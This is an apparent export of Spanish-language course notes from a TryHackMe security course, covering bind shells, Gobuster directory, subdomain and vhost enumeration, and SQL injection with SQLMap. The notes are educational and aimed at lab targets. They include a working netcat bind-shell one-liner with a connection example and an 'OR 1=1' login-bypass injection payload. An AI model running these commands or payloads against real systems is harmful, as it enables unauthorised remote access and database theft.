    "content": "Como indica su nombre, una bind shell se relaciona a un puerto en el sistema comprometido y escucha una conexi√≥n. Cuando ocurre, expone una sesi√≥n shell al atacante. \n\nEste m√©todo puede ser usado cuando el sistema comprometido no permite las conexiones salientes, pero es menos popular ya que necesita permanecer activo y escuchar conexiones, lo que puede llevar a su detecci√≥n.\n\n----------------------\n<h2>¬øC√≥mo funcionan las bind shells?</h2>\n\n----------------------------\n\n<h4>Configurar la Bind Shell en el Objetivo</h4>\nCreemos una bind shell. El atacante puede usar un comando como el de abajo en la m√°quina objetivo:\n\n`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`\n\n-  `rm -f /tmp/f`: Elimina cualquier archivo pipe existente en `/tmp/f`. Esto es para crear una nueva pipe ah√≠ sin conflictos.\n- `mkfifo /tmp/f`: Crea una pipe o FIFO (First In First Out) en `/tmp/f`.\n- `cat /tmp/f`: Lee la informaci√≥n de la pipe (espera input).\n- `| bash -i 2>&1`: El output de cat se pipea a la instancia de shell (`bash -i`), que permite al atacante ejecutar comandos de manera interactiva. El `2>&1` redirecciona los errores al output (stderr a stdout), asegur√°ndose de que cualquier error se manda de vuelta al atacante.\n- `| nc -l 0.0.0.0 8080`: Comienza la conexi√≥n en modo escucha (`-l`) en todas las interfaces (`0.0.0.0`) y el puerto `8080`.\n- `>/tmp/f`: Esta parte manda el output de los comandos de vuelta hacia el pipe, permitiendo comunicaci√≥n bidireccional.\n\nEste comando escuchar√° conexiones entrantes y expondr√° una shell bash. Los puertos por debajo del 1024 necesitan ser ejecutados con privilegios elevados.\n\n------------------------\n<h4>Terminal en la M√°quina Objetivo (Bind Shell Setup)</h4>\n```shell\ntarget@tryhackme:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f\n```\n\nUna vez ejecutado el comando, esperar√° por una conexi√≥n, como se muestra arriba.\n\n-----------------------------\n<h4>El Atacante se Conecta a la Bind Shell</h4>\nAhora que la m√°quina v√≠ctima est√° esperando conexiones, usamos Netcat de nuevo con el siguiente comando para conectarnos:\n\n`nc -nv <IP_OBJETIVO> <PUERTO_OBJETIVO>`\n\n- - `nc`: Llama a la herramienta Netcat.\n- `-n`: Deshabilita la resoluci√≥n DNS.\n- `-v`: Activa verbose para obtener m√°s informaci√≥n.\n- `IP_OBJETIVO`: La direcci√≥n IP del objetivo donde la bind shell est√° corriendo.\n- `PUERTO_OBJETIVO`: El puerto en el que el sistema objetivo escucha.\n\n```shell\nattacker@kali:~$ nc -nv 10.10.13.37 8080 \n(UNKNOWN) [10.10.13.37] 8080 (http-alt) open\ntarget@tryhackme:~$\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Gobuster - The Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/2-gobuster-the-basics/0-gobuster-the-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/2. Gobuster - The Basics/0. Gobuster - The Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 2. Gobuster - The Basics",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/2. Gobuster - The Basics/1. Introduction]]\n[[2. Environment and Setup]]\n[[3. Gobuster - Introduction]]\n[[4. Use Case - Directory and File Enumeration]]\n[[5. Use Case - Subdomain Enumeration]]\n[[6. Use Case - Vhost Enumeration]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/2-gobuster-the-basics/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/2. Gobuster - The Basics/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 2. Gobuster - The Basics",
    "content": "Esta unidad se centra en la herramienta de seguridad ofensiva Gobuster, com√∫nmente usada para reconocimiento. Exploraremos c√≥mo puede enumerar directorios, subdominios y hosts virtuales.\n\n----------------\n<h2>Objetivos de aprendizaje</h2>\n- Entender lo b√°sico de la enumeraci√≥n.\n- C√≥mo usar Gobuster para enumerar los directorios y archivos web.\n- C√≥mo usar Gobuster para enumerar subdominios.\n- C√≥mo usar Gobuster para enumerar hosts virtuales.\n- C√≥mo usar una wordlist.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Gobuster - Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/2-gobuster-the-basics/3-gobuster-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/2. Gobuster - The Basics/3. Gobuster - Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 2. Gobuster - The Basics",
    "content": "Gobuster es un software de c√≥digo abierto escrito en Golang. Enumera directorios, subdominios DNS, hosts virtuales, buckets Amazon S3, y Almacenamiento de Google Cloud por fuerza bruta, usando diccionarios espec√≠ficos y manejando las respuestas entrantes. Muchos profesionales la usan para pruebas de penetraci√≥n, bug bounty, etc. Mirando las fases del hackeo √©tico la podemos colocar en la fase de escaneo y reconocimiento.\n\nEstudiaremos algunos conceptos antes de meternos de lleno con Gobuster.\n\n<h4>Enumeraci√≥n</h4>\nLa enumeraci√≥n es el acto de escuchar los recursos disponibles, ya sean accesibles o no. Por ejemplo, Gobuster enumera directorios web.\n\n<h4>Fuerza Bruta</h4>\nLa fuerza bruta es el acto de intentar cada combinaci√≥n posible hasta dar con una coincidencia. Gobuster usa listas de palabras (diccionarios) para este prop√≥sito.\n\n---------------------------\n<h2>Gobuster: Vista por Encima</h2>\nGobuster viene incluido por defecto en distros como Kali Linux. Veamos primero la p√°gina de ayuda:\n\n```shell\nroot@tryhackme:~# gobuster --help \nUsage:   \n\tgobuster [command]  \nAvailable Commands:   \n\tcompletion  Generate the autocompletion script for the specified shell   \n\tdir         Uses directory/file enumeration mode   \n\tdns         Uses DNS subdomain enumeration mode   \n\tfuzz        Uses fuzzing mode. Replaces the keyword FUZZ in the URL, Headers and the request body   \n\tgcs         Uses gcs bucket enumeration mode   \n\thelp        Help about any command   \n\ts3          Uses aws bucket enumeration mode   \n\ttftp        Uses TFTP enumeration mode   \n\tversion     shows the current version   \n\tvhost       Uses VHOST enumeration mode (you most probably want to use the IP address as the URL parameter)  \n\t\nFlags:       \n\t--debug                 Enable debug output       \n\t--delay duration        Time each thread waits between requests (e.g. 1500ms)   \n\t-h, --help                  help for gobuster       \n\t--no-color              Disable color output       \n\t--no-error              Don't display errors   -z, --no-progress           Don't display progress   \n\t-o, --output string         Output file to write results to (defaults to stdout)   \n\t-p, --pattern string        File containing replacement patterns   \n\t-q, --quiet                 Don`t print the banner and other `noise   \n\t-t, --threads int           Number of concurrent threads (default 10)   \n\t-v, --verbose               Verbose output (errors)   \n\t-w, --wordlist string       Path to the wordlist. Set to - to use STDIN.     \n\t\t--wordlist-offset int   Resume from a given position in the wordlist (defaults to 0)  \nUse \"gobuster [command] --help\" for more information about a command.\n```\n\nEsta p√°gina contiene m√∫ltiples secciones:\n\n- **Usage:** Muestra la sintaxis de c√≥mo usar el comando.\n- **Available Commands:** Hay m√∫ltiples comandos disponibles para ayudarnos a enumerar directorios, archivos, subdominios, buckets de almacenamiento en nube y amazon AWS S3. A lo largo de esta unidad veremos `dir`, `dns` y `vhost`.\n- **Flags:** Son opciones espec√≠ficas que podemos configurar para personalizar nuestros comandos. Veamos las flags que m√°s usaremos a lo largo de la unidad:\n\n| Flag corta | Flag larga   | Descripci√≥n                                                                                                                                                                       |\n| ---------- | ------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| `-t`       | `--threads`  | Configura el n√∫mero de hilos usados por el esc√°ner.Cada uno de estos manda peticiones con un peque√±o retardo. El n√∫mero por defecto es 10.                                        |\n| `-w`       | `--wordlist` | Configura un diccionario para iterar.                                                                                                                                             |\n|            | `--delay`    | Define la cantidad de tiempo que esperar entre cada petici√≥n. Algunos servidores incluyen mecanismos para detectar la enumeraci√≥n por la cantidad de peticiones en cierto tiempo. |\n|            | `--debug`    | Nos ayuda a diagnosticar errores cuando nuestro comando lanza errores inesperados.                                                                                                |\n| `-o`       | `--output`   | Guarda los resultados de la enumeraci√≥n en el archivo especificado.                                                                                                               |\n\n-------------------------------\n<h2>Ejemplo</h2>\nMiremos un ejemplo de c√≥mo podr√≠amos usar estos comandos y flags juntos para enumerar directorios web.\n\n`gobuster dir -u \"http://www.example.thm/\" -w /usr/share/wordlists/dirb/small.txt -t 64`\n\n- `gobuster dir`: Le dice a Gobuster que queremos enumerar directorios.\n- `-u \"http://www.example.thm/\"`: Le dice a Gobuster que la URL objetivo es http://www.example.thm/\n- `-w /usr/share/wordlists/dirb/small.txt`: Le dice a Gobuster que use el diccionario `small.txt` situado en el directrio `/usr/share/wordlists/dirb` de nuestra m√°quina. Usar√° cada entrada del diccionario para mandar una petici√≥n web a esa URL.\n- `-t 64`: Configura el n√∫mero de hilos a utilizar en 64.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Use Case - Subdomain Enumeration",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/2-gobuster-the-basics/5-use-case-subdomain-enumeration/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/2. Gobuster - The Basics/5. Use Case - Subdomain Enumeration.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 2. Gobuster - The Basics",
    "content": "El siguiente modo en el que nos enfocaremos ser√° el modo `dns`. Este nos permite bruteforcear subdominios. Durante un pentest, buscar subdominios de tu objetivo es esencial. Porque una vulnerabilidad est√© parcheada en el dominio principal, no significa que tambi√©n lo est√© en el subdominio.\n\n----------------------\n<h2>Help</h2>\nSi quieres una vista por encima completa de lo que el comando `dns` puede ofrecernos en Gobuster, puedes mirar la p√°gina de help. Como puede ser un poco intimidante, nos centraremos s√≥lo en:\n\n| Flag | Flag larga     | Descripci√≥n                                                                |\n| ---- | -------------- | -------------------------------------------------------------------------- |\n| `-c` | `--show-cname` | Muestra los registros CNAME (no puede ser usado con la flag -i)            |\n| `-i` | `--show-ips`   | Muestra las direcciones IPs hacia las que el dominio y subdomino resuelven |\n| `-r` | `--resolver`   | Configura un DNS personalizado que usar para resolver                      |\n| `-d` | `--domain`     | Configura el dominio que queramos enumerar                                 |\n\n----------------------------\n<h2>¬øC√≥mo usar el modo dns?</h2>\nPara usar el modo `dns` se debe usar la siguiente sintaxis:\n\n`gobuster dns -d example.thm -w /path/to/wordlist`\n\nLas flags `-d` y `-w` son necesarias para que el modo de enumeraci√≥n de subdominios funcione correctamente. Veamos un ejemplo:\n\n`gobuster dns -d example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`\n\n- `gobuster dns`: Enumera subdominios en el dominio configurado.\n- `-d example.thm`: Configura el dominio.\n- `-w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`: Configura el diccionario.\n\nSi probamos el comando deber√≠amos obtener:\n\n```shell\nroot@tryhackme:~# gobuster dns -d example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt\n=============================================================== \nGobuster v3.6 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart) \n=============================================================== \n[+] Domain:     example.thm \n[+] Threads:    10 \n[+] Timeout:    1s \n[+] Wordlist:   /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \n=============================================================== \nStarting gobuster in DNS enumeration mode \n=============================================================== \nFound: www.example.thm\nFound: shop.example.thm√ß\nFound: academy.example.thm\nFound: primary.example.thm                                                                                                                                        Progress: 4989 / 4990 (99.98%) \n=============================================================== \nFinished \n===============================================================\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Use Case - Vhost Enumeration",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/2-gobuster-the-basics/6-use-case-vhost-enumeration/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/2. Gobuster - The Basics/6. Use Case - Vhost Enumeration.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 2. Gobuster - The Basics",
    "content": "El √∫ltimo modo que estudiaremos ser√° el modo `vhost`. Este nos permite bruteforcear hosts virtuales. Los hosts virtuales son diferentes p√°ginas web en una misma m√°quina. A veces, pueden parecer subdominios, pero no es lo mismo. Los hosts virtuales se basan en la IP y corren en el mismo servidor, mientras que los subdominios se configuran en la DNS. La diferencia princcipal es la forma en la que Gobuster investiga estos tipos:\n\n- `vhost`: Navega a la URL creada combinando el hostname configurado (`-u`) y una entrada del diccionario.\n- `dns`: Har√° un lookup DNS al FQDN creado combinando el dominio configurado (`-d`) con una entrada del diccionario.\n\n----------------------------\n<h2>Help</h2>\nSi quieres una vista por encima completa sobre lo que te puede ofrecer el comando `vhost` con Gobuster, puedes ver la p√°gina  de help. Como verla entera puede ser intimidante, vamos a centrarnos en las siguientes funcionalidades:\n\n| Flag corta | Flag larga          | **Descripci√≥n**                                                                            |\n| ---------- | ------------------- | ------------------------------------------------------------------------------------------ |\n| `-u`       | `--url`             | Especifica la URL base (dominio objetivo) para bruteforcear nombres de hosts virtuales.    |\n|            | `--append-domain`   | A√±ade el dominio base a cada entrada del diccionario.                                      |\n| `-m`       | `--method`          | Especifica el m√©todo HTTP a usar para las peticiones                                       |\n|            | `--domain`          | A√±ade un dominio a cada entrada del diccionario (√∫til si no se ofrece de manera expl√≠cita) |\n|            | `--exclude-length`  | Excluye resultados basados en la longitud de la respuesta                                  |\n| `-r`       | `--follow-redirect` | Sigue redirecciones HTTP                                                                   |\n\n-----------------------------\n<h2>¬øC√≥mo usar el modo vhost?</h2>\nPara usar Gobuster con el modo `vhost`, podemos usar la siguiente sintaxis:\n\n`gobuster vhost -u \"http://example.thm\" -w /papth/to/wordlist`\n\nDate cuenta de que las flags `-u` y `-w` son necesarias para la correcta ejecuci√≥n de la herramienta. Veamos un ejemplo de ejecuci√≥n:\n\n   ```shell\n   root@tryhackme:~# gobuster vhost -u \"http://10.10.151.214\" --domain example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250-320  \n=============================================================== \nGobuster v3.6 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== \n[+] Url:              http://10.10.94.214 \n[+] Method:           GET \n[+] Threads:          10 \n[+] Wordlist:         /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \n[+] User Agent:       gobuster/3.6 \n[+] Timeout:          10s \n[+] Append Domain:    true \n[+] Exclude Length:   250,254,263,274,283,293,294,299,253,261,269,277,285,290,300,257,258,270,278,282,291,252,260,264,268,271,279,280,289,251,256,262,265,272,297,287,292,295,255,266,276,284,286,296,267,273,275,281,288,259,298 \n=============================================================== \nStarting gobuster in VHOST enumeration mode \n=============================================================== \nFound: blog.example.thm Status: 200 [Size: 1493] \nFound: shop.example.thm Status: 200 [Size: 2983] \nFound: www.example.thm Status: 200 [Size: 84352] \nFound: chelyabinsk-rnoc-rr02.backbone.example.thm Status: 404 [Size: 304] \nFound: academy.example.thm Status: 200 [Size: 434] \nProgress: 4989 / 4990 (99.98%) \n=============================================================== \nFinished \n===============================================================\n```\n\nNotar√°s que este comando es mucho m√°s complejo que la sintaxis b√°sica. Contiene muchas flags configuadas. Al no tener configurada una infraestructura DNS, tenemos que a√±adir m√°s flags, como `--domain` o `--append-domain`. Necesitamos observar las peticiones que Gobuster manda para entender mejor c√≥mo funcionan estas flags. Abajo podemos ver una petici√≥n GET b√°sica:\n\n```javascript\nGET / HTTP/1.1\nHost: www.example.thm\nUser-Agent: gobuster/3.6\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/ *;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\n```\n\nGobuster mandar√° m√∫ltiples peticiones cambiando el valor `Host:` cada vez. El valor en esta es `www.example.thm`, podemos desglosarlo en tres partes:\n\n- `www`: Este es el subdominio, es la parte que Gobuster llenar√° con cada entrada del diccionario.\n- `.example`: El dominio de segundo nivel, puedes configurarlo con la flag `--domain` (debes configurarlo con el dominio de primer nivel).\n- `.thm`: El dominio de primer nivel. Puedes configurarlo con la flag `--domain` (debes configurarlo con el dominio de segundo nivel).\n\nAhora que conocemos c√≥mo manda peticiones Gobuster, examinemos el comando m√°s detenidamente:\n\n- `gobuster vhost`: Le dice a Gobuster que enumere hosts virtuales.\n- `-u \"http://10.10.151.214\"`: Configura la URL.\n- `-w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`: Configura el diccionario a utilizar.\n- `--domain example.thm`: Configura el dominio de primer y segundo nivel.\n- `--append-domain`: A√±ade cada dominio configurado a cada entrada del diccionario. Si no se configura, el hostname ser√° www, blog, etc y puede causar falsos positivos.\n- `--exlude-length`: Filtra las respuestas que recibimos de las peticiones mandadas en base a su longitud. Sirve para evitar los falsos positivos. Como en general s√≥lo nos interesa el c√≥digo 200 OK, podemos filtrar por rango y decirle `--exclude-length 250-320`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Use Case - Directory and File Enumeration",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/2-gobuster-the-basics/4-use-case-directory-and-file-enumeration/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/2. Gobuster - The Basics/4. Use Case - Directory and File Enumeration.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 2. Gobuster - The Basics",
    "content": "Gobuster tiene un modo `dir`, que nos permite enumerar los directorios web y sus archivos. Este es √∫til al realizar pentesting y explorar la estructura de directorios y los archivos que contienen. Normalmente, las estructuras de directorios siguen una convenci√≥n concreta, haci√©ndolos susceptibles a ser enumerados. Por ejemplo, la estructura de directorios de un servidor web que contiene WordPress es algo como:\n\n\n```bash\nroot@tryhackme:~# tree -L 3 -d \n. \n‚îî‚îÄ‚îÄ html\n\t‚îî‚îÄ‚îÄ wordpress         \n\t‚îú‚îÄ‚îÄ wp-admin         \n\t‚îú‚îÄ‚îÄ wp-content         \n\t‚îî‚îÄ‚îÄ wp-includes\n```\n\nGobuster es una herramienta potente porque te permite escanear una p√°gina web y observar los c√≥digos de respuesta.\n\n-----------------------\n<h2>Help</h2>\nSi quieres una vista por encima completa de lo que el modo `dri` puede hacer en Gobuster, puedes mirar la p√°gina de ayuda con `gobuster dir --help`:\n\n| Flag | Flag larga                 | Descripci√≥n                                                                                                                                                                    |\n| ---- | -------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |\n| `-c` | `--cookies`                | Configura una cookie que pasar con cada petici√≥n, como una cookie de sesi√≥n.                                                                                                   |\n| `-x` | `--extensions`             | Especifica las extensiones que quieres listar (como .php, .js, etc).                                                                                                           |\n| `-H` | `--headers`                | Configura un header completo el cual pasar con cada petici√≥n.                                                                                                                  |\n| `-k` | `--no-tls-validation`      | Se salta el proceso que verifica el certificado TLS cuando se usa HTTPS. Pasa con p√°ginas que est√°n autofirmadas, como un CTF o las rooms en tryhackme que puede causar error. |\n| `-n` | `--no-status`              | Configura esta flag si no quieres ver c√≥digos de estado de cada respuesta en pantalla.                                                                                         |\n| `-P` | `password`                 | Puedes usar esta flag junto a la flag `--username` para lanzar peticiones autentificadas. √ötil cuando ya has obtenido credenciales.                                            |\n| `-s` | `--status-codes`           | Configura qu√© respuestas ver dependiendo de su c√≥digo de estado. De una en una (200) o en rango (300-400).                                                                     |\n| `-b` | `--status-codes-blacklist` | Permite configurar qu√© respuestas NO quieres ver dependiendo de su c√≥digo de estado.                                                                                           |\n| `-U` | `--username`               | Puedes usarla junto a `--password` para lo expuesto arriba.                                                                                                                    |\n| `-r` | `--followredirect`         | Configura Gobuster para seguir la redirecci√≥n que recibi√≥ (301 o 302).                                                                                                         |\n\n----------------------\n<h2>C√≥mo usar el modo dir</h2>\nPara usar Gobuster en modo `dir`, usa el siguiente formato:\n\n`gobuster dir -u <URL> -w <WORDLIST>`\n\nF√≠jate que el comando tambi√©n incluye las flags `-u` y `-w`, adem√°s del modo `dir`. Estas dos flags son necesarias para que Gobuster funcione en modo enumeraci√≥n de directorios. Veamos un caso pr√°ctico:\n\n`gobuster dir -u \"http://www.example.thm\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r `\n\nEste comando escanea todos los directorios en `www.example.thm` usando el diccionario `directory-list-2.3-medium.txt`.\n\n- `gobuster dir`: Configura Gobuster en modo escaneo de directorios.\n- `-u http://www.example.thm`:\n  - La URL ser√° la base donde Gobuster empezar√° a mirar. Puedes pensar en esto como `http://www.example.com/path/to/folder`.\n  - Se requiere el protocolo, si pasaas el erroneo, el escaneo fallar√°, en este caso es `http`.\n  - Si pones la IP en lugar del dominio podr√≠as estar escaneando una web que no es ya que un s√≥lo servidor puede hostear varias p√°ginas web con virtual hosting.\n  - Gobuster no enumera recursivamente, por lo que si ves un directorio que te interese deber√°s escanearlo t√∫ mismo.\n- `-w /usr/hsare/wordlists/dirbuster/directory-list-2.3-medum.txt`: Configura Gobuster para usar dicho diccionario para enumerar. Cada una de las entradas del documenro es a√±adida a la URL base.\n- `-r`: Configura Gobuster para seguir las redirecciones.\n\nMiremos otro ejemplo en el que usamos `-x`:\n\n`gobuster dir -u \"http://www.example.thm\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.js`\n\nEs igual que el comando anterior pero hemos quitado `-r` y a√±adido `-x`. Esta flag configura qu√© extensiones de directorios/archivos debe listar Gobuster.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Environment and Setup",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/2-gobuster-the-basics/2-environment-and-setup/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/2. Gobuster - The Basics/2. Environment and Setup.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 2. Gobuster - The Basics",
    "content": "Para esta unidad, usaremos la m√°quina virtual Ubuntu 20.04 actuando como servidor. Este servidor hostea m√∫ltiples subdominios y hosts virtuales. El servidor tambi√©n tiene dos sistemas de manejo de contenido (CMS) instalados. Estos son WordPress y Joomla.\n\nPuedes encontrar instrucciones de instalaci√≥n de Gobuster en su [repositorio oficial](https://github.com/OJ/gobuster). Para poder asegurarnos de que podemos resolver los dominios usados a lo largo de la unidad, debemos cambiar el archivo `/etc/resolv-dnsmasq`:\n\n- Abre una terminal e introduce el comando `sudo vi /etc/resolv-dnsmasq`.\n- Inserta `nameserver <IP_de_la_maquina>` en la primera l√≠nea.\n- Guarda el archivo presionando `Esc` y escribiendo `:wq`.\n- Introduce el comando `/etc/init.d/dnsmasq restart`.\n\nEl archivo deber√≠a verse as√≠:\n\n```shell-session\nroot@tryhackme:~# cat /etc/resolv-dnsmasq \nnameserver MACHINE_IP\nnameserver 169.254.169.253\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/4-sqlmap-the-basics/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/4. SQLMap - The Basics/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 4. SQLMap - The Basics",
    "content": "SQL Injection es una vulnerabilidad prevalente y ha sido un t√≥pico de debate en la ciberseguridad. Para entender esta vulnerabilidad debemos comprender antes lo que es una base de datos y c√≥mo funciona.\n\nUna base de datos es una colecci√≥n de informaci√≥n que puede ser almacenada, modificada y recuperada. Las p√°ginas web con las que interact√∫as a veces tienen campos que rellenar, como un campo de autentificaci√≥n. ¬øC√≥mo hace la p√°gina web para guardar todos los usuarios y contrase√±as? Con la ayuda de las bases de datos.Tambi√©n pasa con aquellos campos que te dejan buscar, por ejemplo, dentro de un cat√°logo. \n\nLa interacci√≥n puede llevarse a cabo gracias al lenguaje SQL. En esta unidad aprenderemos lo b√°sico de SQL.\n\n--------------------------\n<h2>Objetivos de Aprendizaje</h2>\n- Vulnerabilidad SQL Injection (SQLI).\n- Encontrar campos susceptibles a SQLI mediante SQLMap.\n\n------------------------\n<h2>Pre-requisitos</h2>\n[[0. SQL Fundamentals]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. SQLMap - The Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/4-sqlmap-the-basics/0-sqlmap-the-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/4. SQLMap - The Basics/0. SQLMap - The Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 4. SQLMap - The Basics",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/4. SQLMap - The Basics/1. Introduction]]\n[[2. SQL Injection Vulnerability]]\n[[3. Automated SQL Injection Tool]]\n[[4. Practical Exercise]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Practical Exercise",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/4-sqlmap-the-basics/4-practical-exercise/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/4. SQLMap - The Basics/4. Practical Exercise.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 4. SQLMap - The Basics",
    "content": "1. Entramos en la p√°gina dada:\n   ![[Pasted image 20251019131757.png]]\n2. Con BurpSuite interceptamos la petici√≥n y as√≠ obtenemos la URL con par√°metros:\n   ![[Pasted image 20251019132120.png]]\n3. Metemos la URL en SQLMap:\n   ![[Pasted image 20251019132303.png]]\n4. Observamos los datos arrojados\n   ![[Pasted image 20251019133223.png]]\n5. Miramos las tablas de la base de datos ai:\n   ![[Pasted image 20251019133333.png]]\n6. Obtenemos los datos de las tablas:\n   ![[Pasted image 20251019133552.png]]\n7. Dumpeamos los datos de la tabla user:\n   ![[Pasted image 20251019133635.png]]\n8. Obtenemos los datos y los vemos:\n   ![[Pasted image 20251019134604.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. SQL Injection Vulnerability",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/4-sqlmap-the-basics/2-sql-injection-vulnerability/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/4. SQLMap - The Basics/2. SQL Injection Vulnerability.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 4. SQLMap - The Basics",
    "content": "En la tarea anterior, estudiamos c√≥mo las p√°ginas web y aplicaciones interact√∫an con las bases de datos para almacenar, modificar y recuperar la informaci√≥n de manera estructurada. En esta veremos c√≥mo la interacci√≥n entre la aplicaci√≥n y la base de datos ocurre a trav√©s de queries SQL y c√≥mo los atacantes utilizan estas queries para realizar SQLI.\n\n>[!CAUTION] Prueba m√©todos manuales o autom√°ticos de SQLI pero S√ìLO de aquellas aplicaciones de las cuales tengas permiso expl√≠cito del due√±o para hacerlo.\n\nPongamos un ejemplo:\n\nUna p√°gina web te pide las credenciales y nosotros le mandamos:\n\n`Username: John`\n`Password: Un@detectable444`\n\nUna vez que lo introducimos el sitio web lo recibe y realiza una query SQL a la base de datos con nuestras credenciales:\n\n```SQL\nSELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';\n```\n\nEsta query ser√° ejecutada en la base de datos. Comprobar√° si hay un usuario que sea `John` y si su contrase√±a es `Un@detectable444`. Si lo hay, devolver√° todos sus datos. S√≥lo funcionara si coinciden el usuario y la contrase√±a, debido al `AND` de la query.\n\nSi el input no est√° correctamente sanitizado, los atacantes pueden manipular el input y escribir queries SQL que se ejecutar√°n en la base de datos. La SQLI tiene un efecto muy da√±ino en el mundo digital ya que todas las empresas guardan informaci√≥n (incluida informaci√≥n cr√≠tica).\n\nSi el input no est√° sanitizado, un atacante podr√≠a escribir algo como:\n\n`Username: John`\n`Password: abc' OR 1=1;-- -`\n\n\n\nEsta vez, la query que se ejecutar√≠a se ver√≠a como:\n\n```SQL\nSELECT * FROM users WHERE username = 'John' AND password = 'abd' OR 1=1;-- -';\n```\n\nObserva como el atacante ha sustituido la √∫ltima comilla por la suya (la que escribi√≥ despu√©s de `abc`). Adem√°s insert√≥ el operador `OR` que hace que aunque la contrase√±a sea incorrecta, si el statement que hay a la derecha es `true`, la query ser√° exitosa. Es decir, como 1=1, siempre ser√° exitosa pongamos la contrase√±a que pongamos. Y como acaba la contrase√±a con `;` para cerrar la query sin errores y `-- -` para comentar el resto de la query, esta no ve `';` que restaba de la query anterior, por lo que no falla.",
    "modified": "2025-12-12T13:58:55"
  },
